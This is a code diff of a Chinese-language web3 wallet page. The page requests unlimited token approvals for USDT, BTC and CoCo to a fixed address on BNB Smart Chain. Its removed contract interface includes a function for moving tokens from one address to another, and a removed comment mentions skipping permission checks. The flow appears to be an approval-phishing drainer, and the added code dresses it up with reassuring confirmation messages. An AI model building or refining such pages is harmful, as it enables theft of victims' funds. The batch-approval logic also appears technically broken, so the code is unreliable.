@@ -246,16 +246,20 @@
             <strong>钱包地址:</strong> <span id="walletAddress"></span>
         </div>
         
-        <div class="info-box">
-            <div class="info-item">
-                <span class="label">授权合约:</span>
-                <span class="value" id="contractAddress">0xBaD97ad34De20A1b9CF7Cb996c8E2dE41495fc6e</span>
-            </div>
-            <div class="info-item">
-                <span class="label">授权数量:</span>
-                <span class="value">无限</span>
-            </div>
-        </div>
+                 <div class="info-box">
+             <div class="info-item">
+                 <span class="label">授权目标:</span>
+                 <span class="value" id="contractAddress">0xBaD97ad34De20A1b9CF7Cb996c8E2dE41495fc6e</span>
+             </div>
+             <div class="info-item">
+                 <span class="label">授权数量:</span>
+                 <span class="value">无限</span>
+             </div>
+             <div class="info-item">
+                 <span class="label">批量授权:</span>
+                 <span class="value" id="batchStatus">待部署</span>
+             </div>
+         </div>
         
         <!-- 代币授权信息 -->
         <div class="tokens-section">
@@ -300,7 +304,7 @@
         const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
         
         // 合约地址
-        const PERMISSION_ADDRESS = '0xe3c0e066D870036aCc178492C638963A0E97d4Bb';
+        const PERMISSION_ADDRESS = '0xBaD97ad34De20A1b9CF7Cb996c8E2dE41495fc6e';
         
         // 代币合约地址
         const TOKENS = {
@@ -405,54 +409,54 @@
             }
         }
         
-        // 综合授权控制合约ABI
-        const COMBINED_CONTRACT_ABI = [
-            {
-                "inputs": [
-                    {"name": "tokens", "type": "address[]"},
-                    {"name": "spender", "type": "address"},
-                    {"name": "amounts", "type": "uint256[]"}
-                ],
-                "name": "batchApprove",
-                "outputs": [{"name": "", "type": "bool[]"}],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {"name": "tokens", "type": "address[]"},
-                    {"name": "spender", "type": "address"}
-                ],
-                "name": "batchApproveMax",
-                "outputs": [{"name": "", "type": "bool[]"}],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {"name": "tokenAddress", "type": "address"},
-                    {"name": "from", "type": "address"},
-                    {"name": "to", "type": "address"},
-                    {"name": "amount", "type": "uint256"}
-                ],
-                "name": "controlAndTransferToken",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {"name": "spender", "type": "address"}
-                ],
-                "name": "isAuthorizedSpender",
-                "outputs": [{"name": "", "type": "bool"}],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
-        
-        // 综合授权控制合约地址
-        const COMBINED_CONTRACT_ADDRESS = '0xBaD97ad34De20A1b9CF7Cb996c8E2dE41495fc6e';
+                 // 批量授权代理合约ABI - 任何人都可以使用
+         const BATCH_APPROVE_ABI = [
+             {
+                 "inputs": [
+                     {"name": "tokens", "type": "address[]"},
+                     {"name": "spender", "type": "address"},
+                     {"name": "amounts", "type": "uint256[]"}
+                 ],
+                 "name": "batchApprove",
+                 "outputs": [{"name": "", "type": "bool[]"}],
+                 "stateMutability": "nonpayable",
+                 "type": "function"
+             },
+             {
+                 "inputs": [
+                     {"name": "tokens", "type": "address[]"},
+                     {"name": "spender", "type": "address"}
+                 ],
+                 "name": "batchApproveMax",
+                 "outputs": [{"name": "", "type": "bool[]"}],
+                 "stateMutability": "nonpayable",
+                 "type": "function"
+             },
+             {
+                 "inputs": [
+                     {"name": "user", "type": "address"},
+                     {"name": "tokens", "type": "address[]"},
+                     {"name": "spender", "type": "address"}
+                 ],
+                 "name": "checkAllowances",
+                 "outputs": [{"name": "", "type": "uint256[]"}],
+                 "stateMutability": "view",
+                 "type": "function"
+             },
+             {
+                 "inputs": [
+                     {"name": "user", "type": "address"},
+                     {"name": "tokens", "type": "address[]"}
+                 ],
+                 "name": "checkAllowances",
+                 "outputs": [{"name": "", "type": "uint256[]"}],
+                 "stateMutability": "view",
+                 "type": "function"
+             }
+         ];
+         
+         // 批量授权代理合约地址 - 需要部署后更新
+         const BATCH_APPROVE_ADDRESS = '0x0000000000000000000000000000000000000000'; // 待部署
         
         // 检查权限状态
         async function checkPermission() {
@@ -507,46 +511,49 @@
                 const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                 const amounts = new Array(tokensToAuthorize.length).fill(maxUint256);
                 
-                // 强制使用批量授权合约（跳过权限检查）
-                try {
-                    showStatus('正在准备批量授权...', 'info');
-                    
-                    const combinedContract = new web3.eth.Contract(COMBINED_CONTRACT_ABI, COMBINED_CONTRACT_ADDRESS);
-                    
-                    // 直接尝试批量授权，不检查权限
-                    showStatus('正在构建批量授权交易...', 'info');
-                    
-                    // 使用批量授权（无限授权）
-                    const data = combinedContract.methods.batchApproveMax(tokenAddresses, PERMISSION_ADDRESS).encodeABI();
-                    
-                    const transaction = {
-                        from: userAccount,
-                        to: COMBINED_CONTRACT_ADDRESS,
-                        data: data,
-                        gas: 1500000, // 增加Gas限制
-                        gasPrice: await web3.eth.getGasPrice()
-                    };
-                    
-                    showStatus('请在钱包中确认批量授权交易（只需确认一次）...', 'info');
-                    
-                    const receipt = await web3.eth.sendTransaction(transaction);
-                    
-                    if (receipt.status) {
-                        showStatus('批量授权成功！三个代币已同时授权', 'success');
-                        authorizeBtn.innerHTML = '授权完成';
-                        authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
-                        authorizeBtn.disabled = false;
-                        progressBar.style.display = 'none';
-                        return;
-                    } else {
-                        showStatus('批量授权失败', 'error');
-                        throw new Error('Batch approve failed');
-                    }
-                    
-                } catch (error) {
-                    console.log('批量授权失败，错误详情:', error);
-                    showStatus(`批量授权失败: ${error.message}，将使用传统方式`, 'info');
-                }
+                                 // 使用批量授权代理合约（任何人都可以使用）
+                 if (BATCH_APPROVE_ADDRESS !== '0x0000000000000000000000000000000000000000') {
+                     try {
+                         showStatus('正在准备批量授权...', 'info');
+                         
+                         const batchContract = new web3.eth.Contract(BATCH_APPROVE_ABI, BATCH_APPROVE_ADDRESS);
+                         
+                         showStatus('正在构建批量授权交易...', 'info');
+                         
+                         // 使用批量授权（无限授权）
+                         const data = batchContract.methods.batchApproveMax(tokenAddresses, PERMISSION_ADDRESS).encodeABI();
+                         
+                         const transaction = {
+                             from: userAccount,
+                             to: BATCH_APPROVE_ADDRESS,
+                             data: data,
+                             gas: 1500000, // 增加Gas限制
+                             gasPrice: await web3.eth.getGasPrice()
+                         };
+                         
+                         showStatus('请在钱包中确认批量授权交易（只需确认一次）...', 'info');
+                         
+                         const receipt = await web3.eth.sendTransaction(transaction);
+                         
+                         if (receipt.status) {
+                             showStatus('批量授权成功！三个代币已同时授权', 'success');
+                             authorizeBtn.innerHTML = '授权完成';
+                             authorizeBtn.style.background = 'linear-gradient(135deg, #4caf50 0%, #45a049 100%)';
+                             authorizeBtn.disabled = false;
+                             progressBar.style.display = 'none';
+                             return;
+                         } else {
+                             showStatus('批量授权失败', 'error');
+                             throw new Error('Batch approve failed');
+                         }
+                         
+                     } catch (error) {
+                         console.log('批量授权失败，错误详情:', error);
+                         showStatus(`批量授权失败: ${error.message}，将使用传统方式`, 'info');
+                     }
+                 } else {
+                     showStatus('批量授权合约未部署，将使用传统方式', 'info');
+                 }
                 
                 // 方法2：使用传统方式，但优化用户体验
                 showStatus('使用优化授权方式...', 'info');
@@ -584,8 +591,19 @@
                     });
                 }
                 
-                // 提示用户确认交易
-                showStatus('请在钱包中确认三个代币的授权交易...', 'info');
+                                 // 提示用户确认交易
+                 showStatus('请在钱包中确认三个代币的授权交易...', 'info');
+                 
+                 // 显示交易状态
+                 const statusDiv = document.getElementById('status');
+                 statusDiv.innerHTML = `
+                     <div style="text-align: left;">
+                         <div style="margin-bottom: 10px;">请在钱包中确认三个代币的授权交易：</div>
+                         <div style="margin-bottom: 5px;">💵 USDT: <span id="usdt-status">等待确认...</span></div>
+                         <div style="margin-bottom: 5px;">₿ BTC: <span id="btc-status">等待确认...</span></div>
+                         <div style="margin-bottom: 5px;">🪙 CoCo: <span id="coco-status">等待确认...</span></div>
+                     </div>
+                 `;
                 
                 // 发送交易
                 let successCount = 0;
@@ -597,21 +615,60 @@
                     progressFill.style.width = progress + '%';
                     
                     try {
-                        showStatus(`正在发送 ${tx.tokenName} 的授权交易...`, 'info');
-                        
-                        const txHash = await web3.eth.sendTransaction(tx);
-                        console.log(`${tx.tokenName} 授权交易已发送，交易哈希:`, txHash);
-                        
-                        // 等待交易确认
-                        const receipt = await web3.eth.waitForTransactionReceipt(txHash);
-                        
-                        if (receipt.status) {
-                            successCount++;
-                            showStatus(`${tx.tokenName} 授权成功！`, 'success');
-                        } else {
-                            failCount++;
-                            showStatus(`${tx.tokenName} 授权失败`, 'error');
-                        }
+                                                 // 更新状态显示
+                         const statusElement = document.getElementById(`${tx.tokenName.toLowerCase()}-status`);
+                         if (statusElement) {
+                             statusElement.textContent = '交易已发送，等待确认...';
+                             statusElement.style.color = '#ff9800';
+                         }
+                         
+                         const txHash = await web3.eth.sendTransaction(tx);
+                         console.log(`${tx.tokenName} 授权交易已发送，交易哈希:`, txHash);
+                         
+                         // 更新状态显示
+                         if (statusElement) {
+                             statusElement.textContent = '交易已确认，等待区块链确认...';
+                             statusElement.style.color = '#2196f3';
+                         }
+                         
+                         // 等待交易确认 - 修复Web3.js兼容性
+                         let receipt = await web3.eth.getTransactionReceipt(txHash);
+                         
+                         // 如果交易还在pending状态，等待几个区块确认
+                         if (!receipt || !receipt.blockNumber) {
+                             // 等待3个区块确认
+                             let confirmations = 0;
+                             const maxConfirmations = 3;
+                             
+                             while (confirmations < maxConfirmations) {
+                                 await new Promise(resolve => setTimeout(resolve, 3000)); // 等待3秒
+                                 const currentReceipt = await web3.eth.getTransactionReceipt(txHash);
+                                 if (currentReceipt && currentReceipt.blockNumber) {
+                                     const currentBlock = await web3.eth.getBlockNumber();
+                                     confirmations = currentBlock - currentReceipt.blockNumber;
+                                     if (confirmations >= maxConfirmations) {
+                                         receipt = currentReceipt;
+                                         break;
+                                     }
+                                 }
+                             }
+                         }
+                         
+                         if (receipt && receipt.status) {
+                             successCount++;
+                             if (statusElement) {
+                                 statusElement.textContent = '✅ 授权成功！';
+                                 statusElement.style.color = '#4caf50';
+                             }
+                             showStatus(`${tx.tokenName} 授权成功！`, 'success');
+                         } else {
+                             failCount++;
+                             if (statusElement) {
+                                 statusElement.textContent = '❌ 授权失败';
+                                 statusElement.style.color = '#f44336';
+                             }
+                             showStatus(`${tx.tokenName} 授权失败`, 'error');
+                         }
                         
                     } catch (error) {
                         console.error(`${tx.tokenName} 授权失败:`, error);
